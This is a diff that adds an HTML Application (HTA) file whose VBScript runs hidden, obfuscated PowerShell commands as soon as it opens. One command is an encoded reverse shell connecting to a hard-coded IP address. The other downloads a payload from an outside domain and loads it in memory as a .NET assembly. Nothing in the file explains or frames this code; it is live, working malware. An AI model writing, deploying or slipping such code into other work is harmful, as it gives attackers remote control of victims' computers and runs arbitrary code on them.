@@ -1,0 +1,15 @@
+<html>
+<head>
+<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
+<script language="VBScript">
+     Sub RunProgram
+        Set objShell = CreateObject("Wscript.Shell")
+        Payload = "cm"+"d.e"+"xe /c Powe"+"rShel"+"l.e"+"xe  -WindowStyle hidden -executionpolicy ByPasS -e JABjAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADMANwAuADIANAA3AC4ANQAwAC4AMQAzADUAJwAsADQANAA0ADQAKQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAGUAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAZgA9ACQAZQArACcAUABTACAAJwArACgAcAB3AGQAKQAuAFAAYQB0AGgAKwAnAD4AIAAnADsAJABnAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABmACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAGcALAAwACwAJABnAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkACgA="
+        objShell.Run Payload&"",0,False
+        Payload = "cm"+"d.e"+"xe /c Powe"+"rShel"+"l.e"+"xe  -WindowStyle hidden -executionpolicy ByPasS -command ""$b=(iwr -UseBasicParsing -Uri \""https://allegato.zip/A\"").Content;$s=[System.Convert]::ToBase64String($b);$u=\""TV\""+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($s));$y=[System.Convert]::FromBase64String($u);$a=[System.Reflection.Assembly]::Load($y);$e=$a.GetTypes().Where({ $_.Name -eq 'Program' },'First').GetMethod('Main',[Reflection.BindingFlags] 'Static, Public, NonPublic');$e.Invoke($null,$null)"""
+        objShell.Run Payload&"",0,False
+    End Sub
+RunProgram()
+
+</script>
+</html>
